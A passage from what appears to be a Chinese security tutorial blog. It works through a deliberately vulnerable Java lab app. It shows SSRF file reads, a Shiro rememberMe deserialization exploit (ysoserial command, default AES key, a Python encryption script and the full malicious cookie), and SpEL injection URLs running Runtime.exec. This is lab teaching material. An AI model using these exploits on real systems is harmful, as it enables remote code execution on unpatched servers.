&#123;<br>            html.append(inputLine);<br>        &#125;<br>        in.close();<br>        <span class="hljs-keyword">return</span> html.toString();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.getMessage());<br>        <span class="hljs-keyword">return</span> e.getMessage();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/ssrf/urlConnection/vuln</span>?url=file:<span class="hljs-string">/D</span>:<span class="hljs-string">/1.txt</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080941099.png" alt="20250726112949883"></p><h2 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(value = &quot;/shiro/deserialize&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">shiro_deserialize</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse res)</span> &#123;<br>    <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> getCookie(req, Constants.REMEMBER_ME_COOKIE);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == cookie) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No rememberMe cookie. Right?&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">rememberMe</span> <span class="hljs-operator">=</span> cookie.getValue();<br>        <span class="hljs-type">byte</span>[] b64DecodeRememberMe = java.util.Base64.getDecoder().decode(rememberMe);<br>        <span class="hljs-type">byte</span>[] aesDecrypt = acs.decrypt(b64DecodeRememberMe, KEYS).getBytes();<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bytes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(aesDecrypt);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bytes);<br>        in.readObject();<br>        in.close();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>        <span class="hljs-keyword">if</span> (CookieUtils.addCookie(res, <span class="hljs-string">&quot;rememberMe&quot;</span>, DELETE_ME))&#123;<br>            log.error(e.getMessage());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;RememberMe cookie decrypt error. Set deleteMe cookie success.&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Shiro deserialize&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Shiro  <code>rememberMe</code> 功能用于“记住登录状态”。它的设计逻辑是：</p><p>用户勾选“记住我”登录后，Shiro 把用户的认证信息<strong>序列化为字节流</strong>，用一个固定密钥（默认是 <code>kPH+bIxk5D2deZiIxcaaaA==</code>）用 AES 加密，Base64 编码后作为 <code>rememberMe</code> Cookie 发送给浏览器。当浏览器下次请求时，Shiro：读取 <code>rememberMe</code> Cookie，用同样的密钥进行解密，然后<strong>直接反序列化</strong>出用户对象，只要攻击者能控制 <code>rememberMe</code> Cookie 内容，<strong>就能构造恶意对象反序列化，从而执行任意代码。</strong></p><p><strong>漏洞利用：</strong></p><p>生成恶意序列化数据</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial.<span class="hljs-keyword">jar </span>CommonsBeanutils1 <span class="hljs-string">&quot;calc.exe&quot;</span> &gt; payload.<span class="hljs-keyword">bin</span><br></code></pre></td></tr></table></figure><p>加密 Payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># Shiro 默认密钥</span><br>key = base64.b64decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br><br><span class="hljs-comment"># 读取 payload</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;D:\\CTF-Tools\\ysoserial-master\\target\\payload.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    payload = f.read()<br><br><span class="hljs-comment"># 补齐为 16 的倍数 (PKCS5Padding)</span><br>pad = <span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(payload) % <span class="hljs-number">16</span><br>payload += <span class="hljs-built_in">bytes</span>([pad] * pad)<br><br><span class="hljs-comment"># AES-CBC 加密 (IV 随机生成)</span><br>iv = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">16</span>  <span class="hljs-comment"># 实际攻击需随机 IV</span><br>cipher = AES.new(key, AES.MODE_CBC, iv)<br>encrypted = cipher.encrypt(payload)<br><br><span class="hljs-comment"># Base64 编码</span><br>rememberMe = base64.b64encode(iv + encrypted).decode()  <span class="hljs-comment"># Shiro 格式: IV+密文</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;恶意 Cookie:&quot;</span>, rememberMe)<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">恶意 Cookie: <br>AAAAAAAAAAAAAAAAAAAAAJE6IN+YLEO<span class="hljs-regexp">/t7NuQvYGo54pFMPmAy1jLjUdyV2cc+dKJ0aTntr18Yzsis+1QzDVvl+rnlJLeWPJuL0cSfWAzo+2No6vA3hYfiyY7N7bIdaAAkxZxFdOGUyPMfG4Vp2mmHjn+yS1RXTT9F5R0sGFblDzzZz+nZQsajao/g</span>dRfw9LcryTLP6L34t9wsvsXnBU1VSf5hQbAnLNK8U6tmS8mE71BGg5DVxXjdaZ2Sktj6pGhYmrmySrHqvTuDxmZF+EgIA+g0SQMeALpCzmRK4j4Lmn3JQAqEAhglphaTt+<span class="hljs-number">2</span>UB7rzvNBVbUGHx72GSISDEQiCBRjyufA+sziQUFYCP6DjWEjYOtXKTH+AKulse6AvZXu3Tkybnwa8ZPHPDQGT5b<span class="hljs-regexp">/pNB32K+ftJjsycsFSixp29sAnPqWZQ2c8pOTmznkkXlBdQTDTHtPhGTHntexCFgTHGiqALSXXHWSGmhn8WljmLUFsOLSCgEeWFPZt5uWX78goP5ZDwU/</span>ZYGm5QyIgBBYjjYyuv6nYVZKYbH1A22Iy5sKFjbFXY3YyXWV3hLgmI801jgthjOt5G3iKXhUK557xmEXqe9gZamYVPMxKdIRdiU7fQMPH<span class="hljs-regexp">/7sVd8zAorKWwpoCxU9AedfAZbDFN0I3/g</span>cYI0dAbQg9GyC9jMb5OiDIZE6sFd2XTSWbYQrdnePZe5gPjx8zlntQYl+<span class="hljs-number">7</span>imK4pCFGgBIqX+<span class="hljs-number">1</span>G0O0GvRIBoWUadk5KK8lm9J3aXjtfo25hFu6DnnPnDyRQnudEdQLjNqYpiIxJtNw<span class="hljs-regexp">/W0VgEmjpG2OsLRtsCRddr8/</span>Vky+<span class="hljs-number">6</span>t5i76oEqDU8iPh<span class="hljs-regexp">/Stjj9OfjfSNroe3B5Nbzzh1e0KWVoTPoNRc4d3THTBcaNeK3YnyTN3Ws+88WBG7vbFZF9Fj5GdksjEYcmRDnWbukoLJJH0diWwXT7cSKOdKqAsFQr0meXhGWvMAN1EP74/</span>zvbXM<span class="hljs-regexp">/RpZZlefSQpfeh29D2wxaqdP2ydMTo+qixxTIIEspf4EFI3/</span>vO+kPojn<span class="hljs-regexp">/GA+H38ovGW6reqxHXooV655jmV155px5BFR/</span>MvklhgGyiSPVNoPL567alnOsfhd2R2h3<span class="hljs-regexp">/6VZv04uwu4p4dLa13EL9l+PEOXETpbLQEYmln707qD3+mx+lUD8HHusPJfVtI6CZPzceIdq/</span>c347uFpGmvZv0fzulV2NuWKS2N5rsBmuUR<span class="hljs-regexp">/+RZR9Pdu65/</span>KYqX85Fw1knJYNJF3wKT<span class="hljs-regexp">/uI8deF+D0b/</span>Ib0rzkHWI2nFWQ24T+Zl1<span class="hljs-regexp">/DsEleOAe8KQaS6mfcbfHyyilY0tFL3dw2TmcFqToSoFeuJEGsAiRjM+1bp5TqJmfKUcnbDqLK4ybs+IlUh1ESSTFBiE7soFo9vytcu1l1Q4YL3OwbTLci2CpaugEF6ehkJrQ0a2JlTDScqxVGtkkT13p9+b5XShyLT83rSoVbQWfQuaWw0EIfaz295IzGjmo8F46mo2EJIB0HXbSiRusBU7x4xLgpjvZ5G8c7GkQNOfx96gGHYy6k+yoWcSKWWuKq7SVqgI8bKSDrGT25Ko8dPGpTYjQ5YyVw3PA2AU8VqdaUMWINPNMm5Aoi/</span>AgzKBPup2b+<span class="hljs-number">3</span>V618KprP6u029vuQoW9VysdJCsmA3MyCqQFvCGpaK0KbKWo+<span class="hljs-number">8</span>ZGYqH4sPJH4xJe1SlocC+hJpR+o+AHmD1S7cESYzXXQMMThHbcP2XD84AUvHWCE2N4R8CJBWKn6WlXPQDgQPjt7EQIQVZFExgSY8M<span class="hljs-regexp">/D0o9vQYfxibUt+7RgHQ+4QrZvqxkR9YcdXldx+Fvhjwz/</span>fgg<span class="hljs-regexp">/rktKZf6KChS7vLrZSoIOLeO6a1BVVp9TQKHix1wTs5rTiQyNEBL2q1ZpCIoEbEhRFHeynOgtTjzuUrYZkSZQJ7Llrd8MvejJqCZW9ooOP38g5jmK8tZMX1+G5N/</span>o2X0cKdGWLrUx5SArOLo5tf7LnUF716la<span class="hljs-regexp">/EnO/</span>sgvPAq2URt0umwmnldywDMZl0ZQVQwHySRrl+qbJEnSrdQAppjPtHI4lnW9+SrqIqPbcUieH6yWi0HRrQQXgUUSMgEO2LR<span class="hljs-regexp">/p9cbqG+ouAeLL2RVCUyscWdpbT2k1Ffjpxq98yp7iu0SQScOAmB6eLUBJueow1p+Jl1L5xakot4cpS5TNEiyzGVdNTVr/</span>M9SFzyQTARtW4HdKZoVU2VUMIZUScaudUl+Jjvwi<span class="hljs-regexp">/0haRw/</span>emevd<span class="hljs-regexp">/wjsxM0y7EWaLyjn0NjgXiLpGkEh433iyTBF+0U3j87DAYmA2KKWHsr2aXryYCjJHhKCHXCTq3sEn5OwshulkaeVZaxiCkFx0NeLa37v66DnyctyjVTTIV9nMhKLC62UVFzwkppxwt2RQAgo/</span>YvJHZrhV4SPFgZQMt07yvTCGOhRsWYev+IwidIHrcefeYPDuWTXsO9LAZu9dUTu7R5pM7u7oKbBPpXYuqiCVOm5HQOUPbS<span class="hljs-regexp">/kmBxGFZcEQhP+hI0SliS7+D0Az3YfLHX59AFfRwAN/</span>R1RXkscsUxZ5FT43IcXEFoEsC1rIK46TJWiZErGsPGLphxXsLVrAu<span class="hljs-regexp">/1IlrSbwLp/</span>lUFtJLzmN9LemI2WM1mhn6SiO1QNWX79hSHZjAZTytzSpRXewdcPCmztKIyFZEYLPQlzZ5opck7Vb+<span class="hljs-number">3</span>sxqRYjWucGEnVn8zKdUG<span class="hljs-regexp">/6XG3n1PXReOaXu8ZcK+XcdK57tAwiW2i/</span><span class="hljs-number">4</span>ewrWv6wK3vIZ1S7SecN8Ff7Kg<span class="hljs-regexp">/mNVnAKFNVU/</span><span class="hljs-number">4</span>YgI0hi1tgoou2k89ieMdayFpxQPrsTQHf8TTSsVKzGnU125XYarMHAosNLm9H6dkt09i5Qg72HT<span class="hljs-regexp">/wKq7vkZGOLQ4U9egq3FRsxDL9sq1BayxIqPAVcfjfQ7Ft+e4nYJ0GKANDc8Hv/</span><span class="hljs-number">4</span>ij9qIjJ2rD6f0GUuU0rBS8xFVLenvKPUjneFgDcCtJ2ZmdZJGbH8Wget9lkEYp4ioMR7GSYIJ21bNAX<span class="hljs-regexp">/3imJ21yF2Qt74Gamc1972lYhOEtVWQeYwsW5AsDYIr9hVNysJvlXS6Wq2ear/</span>vv0wALrp8De4IIuAhTxVUj4B2a8i7TcY1wl2UmPMfjnzEpKIQZAeJ96ESqYQSCNhH11NNdL6+Zg9kGqy2Q<span class="hljs-regexp">/bW/</span><span class="hljs-number">1</span>nlTjg+dVs7bd8hq7ZEWo9qFNpCUg9ulN27sZA+nP6tlQYLioDJQtv0uos7EHkLrY63BAwE3yabrxn3RkLnk8arqkedmOag46+vydoiyqzDvka5HuZN7ntLTcggMo4lfG0MhTQji21qbky7zEZxeWty55t<span class="hljs-regexp">/UhCCLVQQsBQcu4v3M6eNe9maR985c1Nw7opVGKb9p1MAm7OCOq4Hkl4rwyWjroSXEaJpjQCdAiikTrMsIj2YDr5kIN79WEITTbBB6iMEimvXpqcy1nqqnNN3D4yKlf2zmwKpyvDYCoz71RCO+1P9O8Js3RftXHrHew2X/</span>Y<span class="hljs-regexp">/2sGrn8YuxthTUBLhA7aF6+jMzVzBhmRygBcrx5E3zkOPIyDwP9jheD9ghHEBvCJE5Se3kXmcY0dsOVZWp1yCSQShAZL0dfCCCcLzG1V/y</span>dV1Y3q8Jt5Q2KslxZkyF5gR94O3<span class="hljs-regexp">/46aqAXSCxyoxT3Sh/</span>SFZ+wEOcI<span class="hljs-regexp">/XOqGrg9J82FnTBCvVOOvtV3mF0KC/</span>p3TD8ARmpy1xE+<span class="hljs-number">1</span>kt9C+CjYL+QAS<span class="hljs-regexp">/G/</span>AppCDhNKAhH6K4gOnSv7XkvbGmw0L5lXj0jxLItOL13xZ6zU0dcDR8LwybZnZadALqTLpFHaBdDEms2QtRn8sIiXvvWqPZvKdbgw3MRcVtA==<br></code></pre></td></tr></table></figure><p>发送 cookie 请求</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">Cookie: <br>rememberMe=AAAAAAAAAAAAAAAAAAAAAJE6IN+YLEO<span class="hljs-regexp">/t7NuQvYGo54pFMPmAy1jLjUdyV2cc+dKJ0aTntr18Yzsis+1QzDVvl+rnlJLeWPJuL0cSfWAzo+2No6vA3hYfiyY7N7bIdaAAkxZxFdOGUyPMfG4Vp2mmHjn+yS1RXTT9F5R0sGFblDzzZz+nZQsajao/g</span>dRfw9LcryTLP6L34t9wsvsXnBU1VSf5hQbAnLNK8U6tmS8mE71BGg5DVxXjdaZ2Sktj6pGhYmrmySrHqvTuDxmZF+EgIA+g0SQMeALpCzmRK4j4Lmn3JQAqEAhglphaTt+<span class="hljs-number">2</span>UB7rzvNBVbUGHx72GSISDEQiCBRjyufA+sziQUFYCP6DjWEjYOtXKTH+AKulse6AvZXu3Tkybnwa8ZPHPDQGT5b<span class="hljs-regexp">/pNB32K+ftJjsycsFSixp29sAnPqWZQ2c8pOTmznkkXlBdQTDTHtPhGTHntexCFgTHGiqALSXXHWSGmhn8WljmLUFsOLSCgEeWFPZt5uWX78goP5ZDwU/</span>ZYGm5QyIgBBYjjYyuv6nYVZKYbH1A22Iy5sKFjbFXY3YyXWV3hLgmI801jgthjOt5G3iKXhUK557xmEXqe9gZamYVPMxKdIRdiU7fQMPH<span class="hljs-regexp">/7sVd8zAorKWwpoCxU9AedfAZbDFN0I3/g</span>cYI0dAbQg9GyC9jMb5OiDIZE6sFd2XTSWbYQrdnePZe5gPjx8zlntQYl+<span class="hljs-number">7</span>imK4pCFGgBIqX+<span class="hljs-number">1</span>G0O0GvRIBoWUadk5KK8lm9J3aXjtfo25hFu6DnnPnDyRQnudEdQLjNqYpiIxJtNw<span class="hljs-regexp">/W0VgEmjpG2OsLRtsCRddr8/</span>Vky+<span class="hljs-number">6</span>t5i76oEqDU8iPh<span class="hljs-regexp">/Stjj9OfjfSNroe3B5Nbzzh1e0KWVoTPoNRc4d3THTBcaNeK3YnyTN3Ws+88WBG7vbFZF9Fj5GdksjEYcmRDnWbukoLJJH0diWwXT7cSKOdKqAsFQr0meXhGWvMAN1EP74/</span>zvbXM<span class="hljs-regexp">/RpZZlefSQpfeh29D2wxaqdP2ydMTo+qixxTIIEspf4EFI3/</span>vO+kPojn<span class="hljs-regexp">/GA+H38ovGW6reqxHXooV655jmV155px5BFR/</span>MvklhgGyiSPVNoPL567alnOsfhd2R2h3<span class="hljs-regexp">/6VZv04uwu4p4dLa13EL9l+PEOXETpbLQEYmln707qD3+mx+lUD8HHusPJfVtI6CZPzceIdq/</span>c347uFpGmvZv0fzulV2NuWKS2N5rsBmuUR<span class="hljs-regexp">/+RZR9Pdu65/</span>KYqX85Fw1knJYNJF3wKT<span class="hljs-regexp">/uI8deF+D0b/</span>Ib0rzkHWI2nFWQ24T+Zl1<span class="hljs-regexp">/DsEleOAe8KQaS6mfcbfHyyilY0tFL3dw2TmcFqToSoFeuJEGsAiRjM+1bp5TqJmfKUcnbDqLK4ybs+IlUh1ESSTFBiE7soFo9vytcu1l1Q4YL3OwbTLci2CpaugEF6ehkJrQ0a2JlTDScqxVGtkkT13p9+b5XShyLT83rSoVbQWfQuaWw0EIfaz295IzGjmo8F46mo2EJIB0HXbSiRusBU7x4xLgpjvZ5G8c7GkQNOfx96gGHYy6k+yoWcSKWWuKq7SVqgI8bKSDrGT25Ko8dPGpTYjQ5YyVw3PA2AU8VqdaUMWINPNMm5Aoi/</span>AgzKBPup2b+<span class="hljs-number">3</span>V618KprP6u029vuQoW9VysdJCsmA3MyCqQFvCGpaK0KbKWo+<span class="hljs-number">8</span>ZGYqH4sPJH4xJe1SlocC+hJpR+o+AHmD1S7cESYzXXQMMThHbcP2XD84AUvHWCE2N4R8CJBWKn6WlXPQDgQPjt7EQIQVZFExgSY8M<span class="hljs-regexp">/D0o9vQYfxibUt+7RgHQ+4QrZvqxkR9YcdXldx+Fvhjwz/</span>fgg<span class="hljs-regexp">/rktKZf6KChS7vLrZSoIOLeO6a1BVVp9TQKHix1wTs5rTiQyNEBL2q1ZpCIoEbEhRFHeynOgtTjzuUrYZkSZQJ7Llrd8MvejJqCZW9ooOP38g5jmK8tZMX1+G5N/</span>o2X0cKdGWLrUx5SArOLo5tf7LnUF716la<span class="hljs-regexp">/EnO/</span>sgvPAq2URt0umwmnldywDMZl0ZQVQwHySRrl+qbJEnSrdQAppjPtHI4lnW9+SrqIqPbcUieH6yWi0HRrQQXgUUSMgEO2LR<span class="hljs-regexp">/p9cbqG+ouAeLL2RVCUyscWdpbT2k1Ffjpxq98yp7iu0SQScOAmB6eLUBJueow1p+Jl1L5xakot4cpS5TNEiyzGVdNTVr/</span>M9SFzyQTARtW4HdKZoVU2VUMIZUScaudUl+Jjvwi<span class="hljs-regexp">/0haRw/</span>emevd<span class="hljs-regexp">/wjsxM0y7EWaLyjn0NjgXiLpGkEh433iyTBF+0U3j87DAYmA2KKWHsr2aXryYCjJHhKCHXCTq3sEn5OwshulkaeVZaxiCkFx0NeLa37v66DnyctyjVTTIV9nMhKLC62UVFzwkppxwt2RQAgo/</span>YvJHZrhV4SPFgZQMt07yvTCGOhRsWYev+IwidIHrcefeYPDuWTXsO9LAZu9dUTu7R5pM7u7oKbBPpXYuqiCVOm5HQOUPbS<span class="hljs-regexp">/kmBxGFZcEQhP+hI0SliS7+D0Az3YfLHX59AFfRwAN/</span>R1RXkscsUxZ5FT43IcXEFoEsC1rIK46TJWiZErGsPGLphxXsLVrAu<span class="hljs-regexp">/1IlrSbwLp/</span>lUFtJLzmN9LemI2WM1mhn6SiO1QNWX79hSHZjAZTytzSpRXewdcPCmztKIyFZEYLPQlzZ5opck7Vb+<span class="hljs-number">3</span>sxqRYjWucGEnVn8zKdUG<span class="hljs-regexp">/6XG3n1PXReOaXu8ZcK+XcdK57tAwiW2i/</span><span class="hljs-number">4</span>ewrWv6wK3vIZ1S7SecN8Ff7Kg<span class="hljs-regexp">/mNVnAKFNVU/</span><span class="hljs-number">4</span>YgI0hi1tgoou2k89ieMdayFpxQPrsTQHf8TTSsVKzGnU125XYarMHAosNLm9H6dkt09i5Qg72HT<span class="hljs-regexp">/wKq7vkZGOLQ4U9egq3FRsxDL9sq1BayxIqPAVcfjfQ7Ft+e4nYJ0GKANDc8Hv/</span><span class="hljs-number">4</span>ij9qIjJ2rD6f0GUuU0rBS8xFVLenvKPUjneFgDcCtJ2ZmdZJGbH8Wget9lkEYp4ioMR7GSYIJ21bNAX<span class="hljs-regexp">/3imJ21yF2Qt74Gamc1972lYhOEtVWQeYwsW5AsDYIr9hVNysJvlXS6Wq2ear/</span>vv0wALrp8De4IIuAhTxVUj4B2a8i7TcY1wl2UmPMfjnzEpKIQZAeJ96ESqYQSCNhH11NNdL6+Zg9kGqy2Q<span class="hljs-regexp">/bW/</span><span class="hljs-number">1</span>nlTjg+dVs7bd8hq7ZEWo9qFNpCUg9ulN27sZA+nP6tlQYLioDJQtv0uos7EHkLrY63BAwE3yabrxn3RkLnk8arqkedmOag46+vydoiyqzDvka5HuZN7ntLTcggMo4lfG0MhTQji21qbky7zEZxeWty55t<span class="hljs-regexp">/UhCCLVQQsBQcu4v3M6eNe9maR985c1Nw7opVGKb9p1MAm7OCOq4Hkl4rwyWjroSXEaJpjQCdAiikTrMsIj2YDr5kIN79WEITTbBB6iMEimvXpqcy1nqqnNN3D4yKlf2zmwKpyvDYCoz71RCO+1P9O8Js3RftXHrHew2X/</span>Y<span class="hljs-regexp">/2sGrn8YuxthTUBLhA7aF6+jMzVzBhmRygBcrx5E3zkOPIyDwP9jheD9ghHEBvCJE5Se3kXmcY0dsOVZWp1yCSQShAZL0dfCCCcLzG1V/y</span>dV1Y3q8Jt5Q2KslxZkyF5gR94O3<span class="hljs-regexp">/46aqAXSCxyoxT3Sh/</span>SFZ+wEOcI<span class="hljs-regexp">/XOqGrg9J82FnTBCvVOOvtV3mF0KC/</span>p3TD8ARmpy1xE+<span class="hljs-number">1</span>kt9C+CjYL+QAS<span class="hljs-regexp">/G/</span>AppCDhNKAhH6K4gOnSv7XkvbGmw0L5lXj0jxLItOL13xZ6zU0dcDR8LwybZnZadALqTLpFHaBdDEms2QtRn8sIiXvvWqPZvKdbgw3MRcVtA==<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942029.png" alt="20250726132755476"></p><p>也可以利用工具：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942947.png" alt="20250726133031514"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942394.png" alt="20250726133042646"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942506.png" alt="20250726133057346"></p><h2 id="SpEL"><a href="#SpEL" class="headerlink" title="SpEL"></a>SpEL</h2><blockquote><p>Spring Expression Language 是一种表达式语言，支持运行时查询和操作对象图，同时也有方法调用和字符串模板功能</p><p>SpEL使用 <code>#{...}</code> 作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法如：</p><blockquote><p>引用其他对象:<code>#{car}</code><br>引用其他对象的属性：<code>#{car.brand}</code><br>调用其它方法 , 还可以链式操作：<code>#{car.toString()}</code></p></blockquote><p>1.类类型表达式</p><p>使用<code>T()</code>运算符会调用类作用域的静态属性或静态方法，SpEL内置了<code>java.lang</code>包下的类声明，也就是说<code>java.lang.String</code>可以通过<code>T(String)</code>访问，而不需要使用全限定名<br>比如：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">T</span><span class="hljs-params">(Runtime)</span></span><span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(\<span class="hljs-string">&quot;open /Applications/Calculator.app\&quot;)</span><br></code></pre></td></tr></table></figure><p>2.类实例化<br>使用new可以直接在SpEL中创建实例，需要创建实例的类要通过全限定名进行访问。<br>比如</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-keyword">new</span> java.util.<span class="hljs-built_in">Date</span>()<br></code></pre></td></tr></table></figure></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/spel/vuln1&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">spel_vuln1</span><span class="hljs-params">(String value)</span> &#123;<br>    <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>    <span class="hljs-keyword">return</span> parser.parseExpression(value).getValue().toString();<br>&#125;<br><br><br><span class="hljs-meta">@RequestMapping(&quot;spel/vuln2&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">spel_vuln2</span><span class="hljs-params">(String value)</span> &#123;<br>    <span class="hljs-type">StandardEvaluationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br>    <span class="hljs-type">SpelExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>    <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(value, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplateParserContext</span>());<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> expression.getValue(context);    <span class="hljs-comment">// trigger vulnerability point</span><br>    <span class="hljs-keyword">return</span> x.toString();   <span class="hljs-comment">// response</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span>/spel/vuln1?value=<span class="hljs-built_in">T</span>(java.lang.Runtime).<span class="hljs-built_in">getRuntime</span>().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)<br>-&gt; http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span>/spel/vuln1?value=<span class="hljs-built_in">T</span>(java.lang.Runtime).<span class="hljs-built_in">getRuntime</span>().<span class="hljs-built_in">exec</span>(%<span class="hljs-number">27</span>calc%<span class="hljs-number">27</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942808.png" alt="20250726134132360"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8081</span>/spel/vuln2?value=$&#123;T(java.lang.Runtime.getRuntime().exec(<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;<br>-&gt; http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8081</span>/spel/vuln2?value=<span class="hljs-variable">%2</span>4<span class="hljs-variable">%7BT</span>(java.lang.Runtime.getRuntime().exec(<span class="hljs-variable">%2</span>7calc<span class="hljs-variable">%27</span>)<span class="hljs-variable">%7D</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942479.png" alt="20250726133936240"></p><h2 id="URLRedirect"><a href="#URLRedirect" class="headerlink" title="URLRedirect"></a>URLRedirect</h2><p>url重定向漏洞主要用来钓鱼，重定向跳转代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 